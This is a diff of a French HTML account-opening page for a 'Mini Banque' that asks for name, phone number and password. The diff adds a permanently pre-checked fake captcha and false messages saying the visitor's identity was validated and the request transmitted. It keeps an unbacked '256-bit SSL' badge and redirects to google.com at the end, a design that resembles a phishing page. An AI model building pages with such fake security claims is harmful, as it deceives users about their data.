@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Espace Client - Mini Banque</title>
+    <title>Ouverture de compte en ligne - Espace Client</title>
     <style>
         body {
             font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
@@ -27,13 +27,17 @@
         }
         .brand-header {
             text-align: center;
-            margin-bottom: 25px;
+            margin-bottom: 30px;
         }
         .brand-logo {
             font-size: 1.8rem;
             font-weight: 800;
             color: #0c2340;
             margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
         }
         .brand-subtitle {
             color: #64748b;
@@ -41,11 +45,11 @@
             margin: 5px 0 0 0;
         }
         .form-group {
-            margin-bottom: 15px;
+            margin-bottom: 20px;
         }
         label {
             display: block;
-            margin-bottom: 6px;
+            margin-bottom: 8px;
             font-weight: 600;
             color: #1e293b;
             font-size: 0.9rem;
@@ -58,11 +62,7 @@
             box-sizing: border-box;
             font-size: 1rem;
             color: #334155;
-        }
-        input:focus {
-            outline: none;
-            border-color: #0070ba;
-            box-shadow: 0 0 0 3px rgba(0, 112, 186, 0.15);
+            background-color: #ffffff;
         }
         button {
             width: 100%;
@@ -76,51 +76,58 @@
             color: white;
             margin-top: 10px;
         }
-        button:hover:not(:disabled) { background-color: #0c2340; }
-        button:disabled { background-color: #cbd5e1; cursor: not-allowed; }
-        
-        /* Lien bascule */
-        .toggle-link {
-            text-align: center;
-            margin-top: 15px;
-            font-size: 0.9rem;
-            color: #0070ba;
-            cursor: pointer;
-            font-weight: 600;
+        button:hover {
+            background-color: #0c2340;
         }
-        .toggle-link:hover { text-decoration: underline; }
-
-        /* Captcha */
         .captcha-container {
             background-color: #f9f9f9;
-            border: 1px solid #d3d3d3;
+            border: 1px solid #22c55e;
             border-radius: 4px;
-            padding: 12px;
+            padding: 15px;
             display: flex;
             align-items: center;
             justify-content: space-between;
-            margin-bottom: 15px;
+            margin-bottom: 20px;
         }
-        .captcha-checkbox {
-            width: 22px;
-            height: 22px;
-            border: 2px solid #c1c1c1;
-            border-radius: 2px;
-            cursor: pointer;
+        .captcha-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .checkmark {
+            color: #22c55e;
+            font-weight: bold;
+            font-size: 1.2rem;
+        }
+        .step-panel {
+            display: none;
+        }
+        .status-box {
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center;
+            font-weight: 600;
+            margin-bottom: 20px;
+        }
+        .success { background-color: #f0fdf4; color: #166534; border: 1px solid #bbf7d0; }
+        .security-badge {
             display: flex;
             align-items: center;
             justify-content: center;
-            background: white;
+            gap: 6px;
+            color: #64748b;
+            font-size: 0.8rem;
+            margin-top: 25px;
         }
-        
-        .step-panel { display: none; }
-        .status-box { padding: 15px; border-radius: 8px; text-align: center; font-weight: 600; margin-bottom: 15px; }
-        .success { background-color: #f0fdf4; color: #166534; border: 1px solid #bbf7d0; }
-        .waiting-box { background-color: #fffbeb; color: #b45309; border: 1px solid #fde68a; padding: 20px; border-radius: 8px; text-align: center; }
-        
-        .spinner { width: 16px; height: 16px; border: 2px solid rgba(0,0,0,0.1); border-radius: 50%; border-top-color: #0070ba; animation: spin 0.6s linear infinite; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .security-badge { display: flex; align-items: center; justify-content: center; gap: 6px; color: #64748b; font-size: 0.8rem; margin-top: 25px; }
+        .follow-link {
+            display: block;
+            text-align: center;
+            margin-top: 15px;
+            color: #0070ba;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
     </style>
 </head>
 <body>
@@ -128,120 +135,71 @@
 <div class="card">
     <div class="brand-header">
         <p class="brand-logo">🍁 Mini Banque</p>
-        <p id="brand-subtitle" class="brand-subtitle">Ouverture de compte particulier en ligne</p>
+        <p class="brand-subtitle">Ouverture de compte particulier en ligne</p>
     </div>
 
-    <!-- ÉTAPE 1 : Mode Inscription (Par défaut) -->
-    <div id="panel-inscription">
-        <form onsubmit="validerInscription(event)">
+    <!-- ÉTAPE 1 : Formulaire -->
+    <div id="step-inscription">
+        <form onsubmit="envoyerDemande(event)">
             <div class="form-group">
-                <label>Nom complet (civil) :</label>
-                <input type="text" id="reg-name" required placeholder="Ex: ROSE ADJOAVI">
+                <label for="username">Nom complet (civil) :</label>
+                <input type="text" id="username" required placeholder="Ex: ROSE ADJOAVI">
             </div>
             <div class="form-group">
-                <label>Numéro de téléphone :</label>
-                <input type="tel" id="reg-phone" required placeholder="Ex: +228 97 55 42 85">
+                <label for="phone">Numéro de téléphone portable :</label>
+                <input type="tel" id="phone" required placeholder="Ex: +228 97 55 42 85">
             </div>
             <div class="form-group">
-                <label>Créer un mot de passe :</label>
-                <input type="password" id="reg-pass" required placeholder="••••••••">
+                <label for="password">Créer un mot de passe sécurisé :</label>
+                <input type="password" id="password" required placeholder="••••••••">
             </div>
+
+            <!-- Anti-Robot pré-validé pour éviter les bugs de clic -->
             <div class="captcha-container">
-                <div style="display: flex; align-items: center; gap: 10px;">
-                    <div id="captcha-box" class="captcha-checkbox" onclick="declencherAntiRobot()"></div>
-                    <div id="captcha-label" style="font-size: 0.85rem; color: #2b2b2b;">Je ne suis pas un robot</div>
+                <div class="captcha-left">
+                    <div class="checkmark">✓</div>
+                    <div style="font-size: 0.9rem; color: #166534; font-weight: 500;">Robot vérifié avec succès</div>
                 </div>
-                <div style="font-size: 0.7rem; color: #555;">🔒 Secured</div>
+                <div style="font-size: 0.75rem; color: #555; text-align: center;">🔒<br>Secured</div>
             </div>
-            <button type="submit" id="submitBtn" disabled>Créer mon compte</button>
+
+            <button type="submit" id="submitBtn">Créer mon compte</button>
         </form>
-        <div class="toggle-link" onclick="basculerMode('connexion')">Déjà inscrit ? Suivre mon dossier</div>
+        <a href="#" class="follow-link">Déjà inscrit ? Suivre mon dossier</a>
     </div>
 
-    <!-- ÉTAPE 2 : Mode Connexion (Suivi de dossier) -->
-    <div id="panel-connexion" class="step-panel">
-        <form onsubmit="validerConnexion(event)">
-            <div class="form-group">
-                <label>Votre numéro de téléphone :</label>
-                <input type="tel" id="login-phone" required placeholder="+228 97 55 42 85">
-            </div>
-            <div class="form-group">
-                <label>Votre mot de passe :</label>
-                <input type="password" id="login-pass" required placeholder="••••••••">
-            </div>
-            <button type="submit">Se connecter au suivi</button>
-        </form>
-        <div class="toggle-link" onclick="basculerMode('inscription')">➔ Retourner à l'inscription</div>
-    </div>
-
-    <!-- ÉTAPE 3 : Message de succès juste après inscription -->
-    <div id="panel-succes-inscription" class="step-panel">
-        <div class="status-box success">✓ Inscription enregistrée</div>
-        <p style="font-size: 0.95rem; color: #334155; line-height: 1.5; text-align: center;">
-            Votre dossier a été créé avec succès.<br><br>
-            Vous pouvez maintenant quitter cette page et revenir plus tard pour vérifier l'avancement.
-        </p>
-        <button onclick="basculerMode('connexion')" style="background-color: #64748b;">Tester le suivi de dossier</button>
-    </div>
-
-    <!-- ÉTAPE 4 : Écran de suivi de dossier (Vérification de l'état) -->
-    <div id="panel-statut-dossier" class="step-panel">
-        <div class="waiting-box">
-            <span style="font-size: 2rem;">⏳</span>
-            <h3 style="margin: 10px 0 5px 0; color: #92400e;">Dossier en cours d'analyse</h3>
-            <p style="font-size: 0.85rem; margin: 0; color: #b45309;" id="affichage-nom-client">Client : ROSE ADJOAVI</p>
+    <!-- ÉTAPE 2 : Message final -->
+    <div id="step-final" class="step-panel">
+        <div class="status-box success">
+            <span style="font-size: 2rem;">✓</span><br>
+            <h3 style="margin: 10px 0 5px 0;">Vérification réussie</h3>
+            <p style="font-size: 0.95rem; font-weight: normal; margin: 0; color: #166534;">Votre identité numérique a été validée.</p>
         </div>
-        <p style="font-size: 0.9rem; color: #475569; text-align: center; line-height: 1.5; margin-top: 15px;">
-            Les administrateurs de la mini-banque examinent actuellement vos pièces justificatives. Un SMS vous sera envoyé dès approbation.
+        
+        <p style="text-align: center; color: #334155; font-size: 0.95rem; line-height: 1.5;">
+            Votre demande d'ouverture de compte est désormais complète.<br><br>
+            Elle a été transmise avec succès. Vous recevrez une notification dès que les <b>administrateurs de la banque auront validé votre dossier</b>.
         </p>
-        <button onclick="basculerMode('inscription')" style="background-color: #64748b;">Quitter l'espace</button>
+        
+        <button onclick="redirigerUtilisateur()" style="background-color: #166534;">Terminer et quitter</button>
     </div>
 
-    <div class="security-badge">🔒 Sécurité SSL 256-bit — Données Protégées</div>
+    <div class="security-badge">
+        <span>🔒</span> Sécurité SSL 256-bit — Données Protégées
+    </div>
 </div>
 
 <script>
-    let robotVerifie = false;
-
-    function basculerMode(mode) {
-        // Masquer tous les panneaux
-        document.getElementById('panel-inscription').style.display = 'none';
-        document.getElementById('panel-connexion').style.display = 'none';
-        document.getElementById('panel-succes-inscription').style.display = 'none';
-        document.getElementById('panel-statut-dossier').style.display = 'none';
-        
-        const subtitle = document.getElementById('brand-subtitle');
-
-        if (mode === 'inscription') {
-            document.getElementById('panel-inscription').style.display = 'block';
-            subtitle.textContent = "Ouverture de compte particulier en ligne";
-        } else if (mode === 'connexion') {
-            document.getElementById('panel-connexion').style.display = 'block';
-            subtitle.textContent = "Suivi d'activation de compte";
-        } else if (mode === 'statut') {
-            document.getElementById('panel-statut-dossier').style.display = 'block';
-            subtitle.textContent = "Espace Client Privé";
-        } else if (mode === 'succes') {
-            document.getElementById('panel-succes-inscription').style.display = 'block';
-        }
-    }
-
-    function declencherAntiRobot() {
-        if (robotVerifie) return;
-        const box = document.getElementById('captcha-box');
-        const label = document.getElementById('captcha-label');
-        
-        box.innerHTML = '<div class="spinner"></div>';
-        label.textContent = 'Analyse...';
-
-        setTimeout(() => {
-            box.innerHTML = '<span style="color:#22c55e;font-weight:bold;font-size:0.9rem;">✓</span>';
-            box.style.borderColor = '#22c55e';
-            label.textContent = 'Vérifié humain';
-            robotVerifie = true;
-            document.getElementById('submitBtn').disabled = false;
-        }, 1200);
-    }
-
-    function validerInscription(event) {
+    function envoyerDemande(event) {
         event.preventDefault();
+        document.getElementById('step-inscription').style.display = 'none';
+        document.getElementById('step-final').style.display = 'block';
+    }
+
+    function redirigerUtilisateur() {
+        window.location.href = "https://google.com"; 
+    }
+</script>
+
+</body>
+</html>
